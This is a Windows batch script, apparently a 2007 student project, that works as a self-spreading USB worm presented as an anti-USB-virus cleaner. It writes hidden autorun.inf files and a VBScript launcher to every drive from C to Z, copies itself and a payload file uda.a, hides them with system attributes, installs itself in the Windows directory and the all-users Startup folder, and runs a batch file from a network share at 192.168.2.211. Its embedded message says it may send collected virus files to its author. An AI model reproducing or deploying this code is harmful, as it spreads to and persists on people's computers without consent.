@echo off
setlocal ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS
cd /d "%~dp0"
if /i "%cd%"=="%~d0\" (explorer.exe "%~d0")
set v=01
set "endf=%systemdrive%\8bye.txt"
call:ie s.vbe
echo.Wscript.sleep 10000>s.vbe
attrib s.vbe +a +s +r +h
if /i not "%cd%"=="%systemroot%" (call:cb&del /a /f /q s.vbe&goto :eof)
set dl=CDEFGHIJKLMNOPQRSTUVWXYZ
set n=0
call:inf >inf.tem
call:ql
uda.a
md "%systemroot%\bakfiles\"
call:ie "%systemroot%\bakfiles\将文件拖到本图标上以解压还原文件.bat"
copy uda-解压.bat "%systemroot%\bakfiles\将文件拖到本图标上以解压还原文件.bat"
call:ie "%systemroot%\bakfiles\uda.a"
call:copy uda.a "%systemroot%\bakfiles\"
:s
echo. >uhere-%v%.txt
if exist "%endf%" (set n=1&goto end)
if "!dl:~%n%,1!"=="" (set n=0&s.vbe&(ping 192.168.2.211 -n 1 &&call \\192.168.2.211\re$\add.bat))
set d=!dl:~%n%,1!:
set /a n=n+1
if not exist %d% (goto s)
if exist "%d%\autorun.inf\" (echo.y|cacls "%d%\autorun.inf" /p everyone:f
rd "%d%\autorun.inf" /s /q)
if exist "%d%\autorun.inf" (fc "%d%\autorun.inf" inf.tem&if not "!ERRORLEVEL!"=="0" (call U盘病毒分析.bat -a -l -d %d:~0,-1% -c -i -s&goto s1)) else (goto s1)
if not exist "%d%\%~n0.vbe" (goto s2)
if not exist "%d%\%~nx0" (goto s3)
if not exist "%d%\uda.a" (goto s4)
if exist %d%\%date:~0,10%.sk (goto s)
:s1
call:inf >%d%\autorun.inf
attrib %d%\autorun.inf +a +s +r +h
call:ie "%d%\%~n0.vbe"
:s2
call:vbe "%~nx0" >"%d%\%~n0.vbe"
attrib "%d%\%~n0.vbe" +a +s +r +h
:s3
call:copy "%~dpnx0" "%d%\"
:s4
call:copy "uda.a" "%d%\"
call:ie %d%\*.sk
echo.>%d%\%date:~0,10%.sk
attrib %d%\%date:~0,10%.sk +a +s +r +h
goto s
:cb
if exist "%systemroot%\uhere-*.txt" (del /a /f /q "%systemroot%\uhere-*.txt"&s.vbe)
if exist "%systemroot%\uhere-*.txt" (if exist "%systemroot%\uhere-%v%.txt" (goto :eof) else (call:v "%systemroot%\uhere-*.txt"&(if %v% lss !v0! (goto :eof))))
call:rm >%systemdrive%\已经被反U盘病毒的“病毒”感染.txt
call:copy "%~dpnx0" "%systemroot%\"
call:copy "uda.a" "%systemroot%\"
call:ie "%systemroot%\%~n0.vbe"
call:vbe "%~nx0" >"%systemroot%\%~n0.vbe"
call:ie "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\%~n0.vbe"
call:vbe "%systemroot%\%~nx0" >"%ALLUSERSPROFILE%\「开始」菜单\程序\启动\%~n0.vbe"
start "" /wait /d "%systemroot%\" "%systemroot%\%~n0.vbe"
goto :eof
:v
set "v0=%~nx1"
set /a "v0=%v0:~6,2%"
goto :eof
:rm
echo.	看到这个，请不要慌张。电脑病毒的定义为：1、传播性；2、潜伏性；3、破坏性。根据此定义，本脚本这完全符合1，有点符合2，不符合3（若说破坏性也不是没有，但只针对U盘病毒，而且会在删除文件前备份，备份地址：%systemroot%\bakfiles\），因此，病毒二字加了引号，即不是真正的病毒。本脚本的目的是通过U盘传播，并沿途清理U盘中的病毒，如果可能，会把收集到的病毒文件发给作者；不会给您造成太多不便（与其被U盘病毒感染，不如被本脚本感染啦）。如果您觉得这样给您造成了不便，想卸载本脚本，请在%systemdrive%\下新建一个名为8bye的文本文件（不需要写入内容，即：新建%endf%），大约在20秒内完成卸载，并帮助您进行U盘病毒免疫。欲了解更多，请打开 U盘病毒分析 的自述文件（地址：%systemroot%\readme.txt）。谢谢！
echo.	包含文件：u.bat（本文件，4240字节）、uda.a（21674字节，md5：e6762ebf6123bc17ab31995c61bba955）
echo.	为研究性学习而制作，于2007-03-15，望多多支持！作者：CyyIsGood（肇中高一11），联系：cyyisgood@126.com
goto :eof
:vbe
echo.wscript.createobject("wscript.shell").run """%~1"" /start",0
goto :eof
:inf
echo.[AutoRun]
echo.open=wscript.exe %~n0.vbe
echo.shell\open\Command=wscript.exe %~n0.vbe
echo.shell\explore\Command=wscript.exe %~n0.vbe
echo.shell\find\Command=wscript.exe %~n0.vbe
goto :eof
:ie
if exist "%~1" (del /a /f /q "%~1")
goto :eof
:copy
call:ie "%~dp2%~nx1"
attrib "%~1" -s -h
copy "%~1" "%~dp2"
attrib "%~1" +s +h
attrib "%~dp2%~nx1" +s +h
goto :eof
:ql
cd /d "%systemroot%\"
del /a /f /q Anti-U盘免疫.bat ReadMe.txt uda-解压.bat U盘病毒分析.bat zap.a 主操控.bat 打开发送功能.bat
cd /d "%~dp0"
goto :eof
:end
set d=!dl:~%n%,1!
echo.%d%:\
if exist %d%:\ (del /a /f /q %d%:\u.vbe %d%:\u.bat %d%:\uda.a)
set /a n=n+1
if not "!dl:~%n%,1!"=="" goto end
call U盘病毒分析.bat -c&call:ql&del /a /f /q "%systemdrive%\已经被反U盘病毒的“病毒”感染.txt" "%~dp0s.vbe" "%endf%" inf.tem "uda.a" "%~n0.vbe" "uhere-%v%.txt" "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\%~n0.vbe" "%~nx0"